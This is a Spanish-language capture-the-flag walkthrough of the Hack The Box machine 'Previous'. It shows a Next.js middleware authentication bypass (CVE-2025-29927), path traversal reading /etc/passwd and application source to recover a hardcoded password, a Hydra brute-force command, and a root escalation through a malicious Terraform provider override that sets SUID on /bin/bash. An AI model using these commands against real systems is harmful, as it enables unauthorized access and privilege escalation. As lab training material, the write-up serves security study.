
# Previous

<figure><img src="/files/qPMGQD05XFAzV3A0dpnP" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Previous`
* **IP:** `10.10.11.83`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `03/09/2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.83 previous.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.83
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://previous.htb` y observamos que parece ser una plataforma que crea la tecnología PreviousJS, relacionada con JavaScript.

<figure><img src="/files/YO1kf8AEkB5qv9uFUs6a" alt=""><figcaption></figcaption></figure>

Los dos botones de Get Started y Docs nos llevan a la página de login, pero no encontramos ninguna página de registro.

<figure><img src="/files/UnSFcJ7vHyk3VtzcXeHP" alt=""><figcaption></figcaption></figure>

La autenticación parece que se hace a través de API, por lo que igual podríamos llegar a extraer algún usuario si es poco segura.

Pasándole whatweb para enumerar las tecnologías encontramos un usuario `jeremy` y la versión de `nginx 1.18`:

```bash
whatweb -a3 -v http://previous.htb

WhatWeb report for http://previous.htb
Status    : 200 OK
Title     : <None>
IP        : 10.10.11.83
Country   : RESERVED, ZZ

Summary   : Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], nginx[1.18.0], Script[application/json], X-Powered-By[Next.js]

Detected Plugins:
[ Email ]
	Extract email addresses. Find valid email address and 
	syntactically invalid email addresses from mailto: link 
	tags. We match syntactically invalid links containing 
	mailto: to catch anti-spam email addresses, eg. bob at 
	gmail.com. This uses the simplified email regular 
	expression from 
	http://www.regular-expressions.info/email.html for valid 
	email address matching. 

	String       : jeremy@previous.htb
	String       : jeremy@previous.htb

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : nginx/1.18.0 (Ubuntu) (from server string)
```

**Tecnologías web:**

* Nginx 1.18.0
* Next.js
* API REST (endpoints bajo `/api`)

Con esto ya solo faltaría encontrar la contraseña de `jeremy` para acceder.

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

```bash
ffuf -u http://previous.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api/experiments/configurations [Status: 307, Size: 66, Words: 1, Lines: 1, Duration: 82ms]
api                     [Status: 307, Size: 35, Words: 1, Lines: 1, Duration: 82ms]
api/experiments         [Status: 307, Size: 49, Words: 1, Lines: 1, Duration: 82ms]
apis                    [Status: 307, Size: 36, Words: 1, Lines: 1, Duration: 56ms]
docs                    [Status: 307, Size: 36, Words: 1, Lines: 1, Duration: 102ms]
docs51                  [Status: 307, Size: 38, Words: 1, Lines: 1, Duration: 102ms]
docs41                  [Status: 307, Size: 38, Words: 1, Lines: 1, Duration: 102ms]
signin                  [Status: 200, Size: 3481, Words: 179, Lines: 1, Duration: 123ms]
```

**Directorios encontrados:**

* `/signin` → página de login
* `/api` y varios sub-endpoints (`/api/experiments`, `/api/experiments/configurations`) → responden con redirecciones `307`
* `/docs`, `/docs41`, `/docs51` → también redirecciones `307`

***

## <mark style="color:purple;">Captura de Login</mark>

Al capturar un login con BurpSuite observamos que la autenticación está gestionada con **NextAuth.js** (`/api/auth/providers` es la ruta típica).

<figure><img src="/files/IkxUvMgjZ33s1XRqj4a7" alt=""><figcaption></figcaption></figure>

Esto nos da varias pistas importantes:

* NextAuth expone varios endpoints bajo `/api/auth/*`:
  * `/api/auth/providers` → lista de métodos de login (en este caso, probablemente **credentials**).
  * `/api/auth/signin` → formulario de login.
  * `/api/auth/callback/credentials` → donde realmente se envían user/pass en POST.
  * `/api/auth/session` → devuelve info de la sesión actual si está autenticada.
* Ya tenemos un **usuario válido**: `jeremy`.
* El **callbackUrl** apunta a `/docs`, lo cual confirma que tras login deberíamos tener acceso a documentación protegida.

### Pasos de explotación

#### 1. Confirmar proveedores de login

```bash
curl -s http://previous.htb/api/auth/providers | jq

{
  "credentials": {
    "id": "credentials",
    "name": "Credentials",
    "type": "credentials",
    "signinUrl": "http://localhost:3000/api/auth/signin/credentials",
    "callbackUrl": "http://localhost:3000/api/auth/callback/credentials"
  }
}
```

Con esto confirmamos que el login es con **NextAuth Credentials Provider** → eso significa que el flujo correcto es:

```
POST /api/auth/callback/credentials
Content-Type: application/json
```

con un body JSON que lleve usuario y contraseña.

#### Importante destacar que

* El `callbackUrl` apunta a `http://localhost:3000/...` → típico de configuraciones por defecto, lo que suele indicar que la app puede estar mal configurada (a veces se filtran cosas o se permiten redirecciones inseguras).
* Necesitamos **averiguar cómo se llama exactamente el campo del usuario** → podría ser `username`, `user`, `email`, etc.

### Prueba de credenciales

Probamos con un payload cómo:

```bash
curl -i -X POST http://previous.htb/api/auth/callback/credentials \
  -H "Content-Type: application/json" \
  -d '{"email":"jeremy@previous.htb","password":"wrongpass"}'

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 02 Sep 2025 12:55:33 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: next-auth.csrf-token=7be1fd718e68338451f9c180d710e434f1edab274ec1c464bea92e89412f951e%7C8b06373ebae0044c4f591ffade70a23023e03348178023fa9d667609a6b96f29; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000; Path=/; HttpOnly; SameSite=Lax
Location: http://localhost:3000/api/auth/signin?csrf=true
```

Con eso observamos que:

* El **campo correcto es `email`**, no `username`.
* El login devuelve siempre un **302 Redirect a `/api/auth/signin?csrf=true`** → típico de NextAuth cuando las credenciales son inválidas.
* Eso significa que **la diferencia de credenciales válidas se verá en la respuesta del redirect o en las cookies** (ej. `next-auth.session-token`).

### Ataque de fuerza bruta con Hydra

Ya podemos lanzar un password spraying contra **jeremy**:

```bash
hydra -l jeremy@previous.htb -P /usr/share/wordlists/rockyou.txt previous.htb \
  http-post-form "/api/auth/callback/credentials:email=^USER^&password=^PASS^:csrf=true"
```

No obtenemos resultados, por lo que buscaremos algún exploit público.

***

## <mark style="color:purple;">Explotación</mark>

### CVE-2025-29927[#](https://www.hyhforever.top/posts/2025/08/htb-previous/#cve-2025-29927)

Buscando vulnerabilidades relacionadas, podemos encontrar una autenticación de bypass:

{% embed url="<https://www.neoxs.me/blog/critical-nextjs-middleware-vulnerability-cve-2025-29927-authentication-bypass>" %}

### Contexto de la vulnerabilidad

* **CVE-2025-29927** afecta a aplicaciones con **Next.js / NextAuth** en combinación con middlewares.
* El fallo está en cómo manejan las **subrequests internas de Next.js**.
* Si añadimos el header especial:

```http
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

el backend interpreta la petición como “interna” y **omite ciertas comprobaciones de autenticación**.

Vamos a probar con `curl` sobre la ruta protegida `/docs`:

{% code overflow="wrap" %}

```bash
curl -i http://previous.htb/docs \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 02 Sep 2025 13:14:07 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3353
Connection: keep-alive
X-Powered-By: Next.js
ETag: "tgdw538y2p2l1"
Vary: Accept-Encoding

<!DOCTYPE html><html><head><meta charSet="utf-8" data-next-head=""/><meta name="viewport" content="width=device-width" data-next-head=""/><title data-next-head="">PreviousJS Docs</title><link rel="preload" href="/_next/static/css/9a1ff1f4870b5a50.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9a1ff1f4870b5a50.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-cb370083d4f9953f.js" defer=""></script><script src="/_next/static/chunks/framework-ee17a4c43a44d3e2.js" defer=""></script><script src="/_next/static/chunks/main-0221d9991a31a63c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-95f33af851b6322a.js" defer=""></script><script src="/_next/static/chunks/8-fd0c493a642e766e.js" defer=""></script><script src="/_next/static/chunks/0-c54fcec2d27b858d.js" defer=""></script><script src="/_next/static/chunks/pages/docs-5f6acb8b3a59fb7f.js" defer=""></script><script src="/_next/static/qVDR2cKpRgqCslEh-llk9/_buildManifest.js" defer=""></script><script src="/_next/static/qVDR2cKpRgqCslEh-llk9/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="flex min-h-screen bg-white"><div class="sticky top-0 h-screen w-64 border-r bg-gray-50 p-6"><h2 class="mb-6 text-lg font-semibold">PreviousJS</h2><nav><ul class="space-y-2"><li><a class="block rounded px-3 py-2 text-sm transition-colors text-gray-600 hover:bg-gray-100" href="/docs/getting-started">Getting Started</a></li><li><a class="block rounded px-3 py-2 text-sm transition-colors text-gray-600 hover:bg-gray-100" href="/docs/examples">Examples</a></li></ul></nav></div><main class="flex-1 p-8 lg:px-12 lg:py-10"><article class="prose prose-slate max-w-none"><h1>Documentation Overview</h1><p class="lead">Welcome to the documentation for PreviousJS. Get started with our comprehensive guides and API references.</p><div class="not-prose mt-8 grid gap-4 sm:grid-cols-2"><div class="rounded-lg border p-6"><h3 class="mb-2 text-lg font-semibold">Getting Started</h3><p class="mb-4 text-gray-600">New to PreviousJS? Begin here with basic setup and fundamental concepts.</p><a href="/docs/getting-started" class="text-blue-600 hover:underline">Start learning →</a></div><div class="rounded-lg border p-6"><h3 class="mb-2 text-lg font-semibold">Examples</h3><p class="mb-4 text-gray-600">Detailed examples.</p><a href="/docs/api-reference" class="text-blue-600 hover:underline">Explore examples →</a></div></div><div class="mt-8 border-t pt-8"><h2>Latest Updates</h2><ul class="text-sm text-gray-600"><li class="mt-2">v1.2.0 - Feat: middleware is now opt-out!</li><li class="mt-2">v1.1.4 - Improved TypeScript support</li><li class="mt-2">v1.1.0 - Performance optimizations</li></ul></div></article></main><div class="fixed top-0 right-0 p-4 bg-gray-100 border-t border-gray-200 shadow-md"><p class="text-sm text-gray-600">Logged in as <b>???</b></p><a href="#" class="cursor-pointer text-sm text-blue-600 hover:text-blue-800 underline">Sign out</a></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/docs","query":{},"buildId":"qVDR2cKpRgqCslEh-llk9","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>% 
```

{% endcode %}

### Fuzzing de parámetros

Sin embargo, parece que no hay forma de omitir el inicio de sesión directamente. En este caso, se escanea el directorio /api para ver si hay alguna interfaz que requiera autenticación.

```bash
dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_previous.htb/_api_25-09-02_21-17-33.txt

Target: http://previous.htb/

[21:17:33] Starting: api/
[21:17:33] 308 -   22B  - /api/%2e%2e//google.com  ->  /api/%2E%2E/google.com
[21:17:54] 400 -   64B  - /api/auth/adm
[21:17:54] 400 -   64B  - /api/auth/login
[21:17:54] 400 -   64B  - /api/auth/admin
[21:17:54] 400 -   64B  - /api/auth/login.aspx
[21:17:54] 400 -   64B  - /api/auth/login.jsp
[21:17:54] 400 -   64B  - /api/auth/login.php
[21:17:54] 400 -   64B  - /api/auth/login.html
[21:17:54] 400 -   64B  - /api/auth/login.js
[21:17:54] 400 -   64B  - /api/auth/logon
[21:17:54] 302 -    0B  - /api/auth/signin  ->  /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
[21:17:54] 308 -   23B  - /api/axis//happyaxis.jsp  ->  /api/axis/happyaxis.jsp
[21:17:54] 308 -   28B  - /api/axis2-web//HappyAxis.jsp  ->  /api/axis2-web/HappyAxis.jsp
[21:17:54] 308 -   34B  - /api/axis2//axis2-web/HappyAxis.jsp  ->  /api/axis2/axis2-web/HappyAxis.jsp
[21:17:57] 308 -   56B  - /api/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /api/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[21:18:02] 400 -   28B  - /api/download
```

La rura /api/download parece sospechosa, por lo que la analizaremos más en detalle buscando parámetros accesibles:

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 91ms]
```

Encontramos el parámetro example, por lo que lo probamos con curl de la siguiente manera:

```bash
curl 'http://previous.htb/api/download?example=aaa' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -v

* Host previous.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.83
*   Trying 10.10.11.83:80...
* Connected to previous.htb (10.10.11.83) port 80
* using HTTP/1.x
> GET /api/download?example=aaa HTTP/1.1
> Host: previous.htb
> User-Agent: curl/8.13.0
> Accept: */*
> X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
> 
* Request completely sent off
< HTTP/1.1 404 Not Found
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 02 Sep 2025 19:20:55 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 26
< Connection: keep-alive
< ETag: "c8wflmak5q"
< Vary: Accept-Encoding
< 
* Connection #0 to host previous.htb left intact
{"error":"File not found"}% 
```

Perfecto! El parámetro funciona pero no ha encontrado el archivo "`aaa`" de prueba que hemos introducido, por lo que intentaremos un Local File Inclusion para intentar obtener por ejemplo el /etc/passwd.

### Local File Inclusion

```bash
curl 'http://previous.htb/api/download?example=../../../../etc/passwd' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -v 

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

Bingo! Tenemos el `/etc/hosts`. Observamos dos usuarios: `node` y `nextjs`. Revisé las variables de entorno y descubrí que la ruta de inicio era `/app`.

```bash
curl 'http://previous.htb/api/download?example=../../../../proc/self/environ' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'  --output -

NODE_VERSION=18.20.8
HOSTNAME=0.0.0.0
YARN_VERSION=1.22.22S
HLVL=1
PORT=3000
HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NEXT_TELEMETRY_DISABLED=1
PWD=/app
NODE_ENV=production#    
```

### Investigando la app NextJS

Encontramos un archivo de enrutamiento en `/app/.next/routes-manifest.json`:

<pre class="language-bash"><code class="lang-bash">curl 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -s | jq
<strong>
</strong><strong>{
</strong>  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?&#x3C;nxtPnextauth>.+?)(?:/)?$"
    },
    
&#x3C;-----SNIP----->
</code></pre>

Entre ellos se encuentra la parte de la lógica de autenticación que nos preocupa: `/api/auth/[...nextauth]`

{% code overflow="wrap" %}

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'

"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();%    
```

{% endcode %}

Que contiene las credenciales de usuario que queremos

```shell
username: jeremy
password: MyNameIsJeremyAndILovePancakes
```

***

## <mark style="color:purple;">Acceso Inicial y User Flag</mark>

Con estas credenciales vamos a acceder directamente por SSH y observamos que funcionan!

```bash
ssh jeremy@previous.htb

The authenticity of host 'previous.htb (10.10.11.83)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'previous.htb' (ED25519) to the list of known hosts.

jeremy@previous.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

jeremy@previous:~$ whoami
jeremy
```

```bash
jeremy@previous:~$ ls
docker  user.txt

jeremy@previous:~$ cat user.txt
4b382f543f27efeb6292897c0*******
```

***

## <mark style="color:purple;">Escalada de Privilegios en Terraform</mark>

### Enumeración de Privilegios

Encontramos que tenemos permisos de ejecución como root en `/usr/bin/terraform -chdir\=/opt/examples apply`:

```bash
jeremy@previous:~/docker/previous$ sudo -l

Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Y al ejecutarlo cómo sudo obtenemos lo siguiente:

```bash
jeremy@previous:/tmp$ sudo /usr/bin/terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
```

No podemos escribir directamente en `/opt/examples`, así que buscaremos una solución.

### **Crear el Directorio y Archivos Necesarios**

Creamos un directorio para el proveedor malicioso y el archivo de configuración de Terraform.

```bash
mkdir -p /home/jeremy/privesc
cd /home/jeremy/privesc
```

#### **1. Crear el Proveedor Malicioso**

Crea un script que otorgue permisos SUID a `/bin/bash`.

```bash
cat > terraform-provider-examples_v0.1.0_linux_amd64 << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF

chmod +x terraform-provider-examples_v0.1.0_linux_amd64
```

{% hint style="info" %}
**Nota:** La versión (`v0.1.0`) debe coincidir con la especificada en el archivo `.terraform.lock.hcl` de `/opt/examples`.
{% endhint %}

#### **2. Configurar el Override del Proveedor**

Crea un archivo de configuración de Terraform (`dev.tfrc`) que apunte al directorio del proveedor malicioso:

```bash
cat > dev.tfrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/privesc"
  }
  direct {}
}
EOF
```

#### **3. Ejecutar Terraform con la Configuración Maliciosa**

Establece la variable de entorno para usar la configuración personalizada y ejecuta Terraform con `sudo`.

```bash
export TF_CLI_CONFIG_FILE=/home/jeremy/privesc/dev.tfrc
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

```shell-session
jeremy@previous:~/privesc$ /bin/bash -p

bash-5.1# whoami
root
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
bash-5.1# cat /root/root.txt
d52a23286db3ad15115801dcf732023e
```
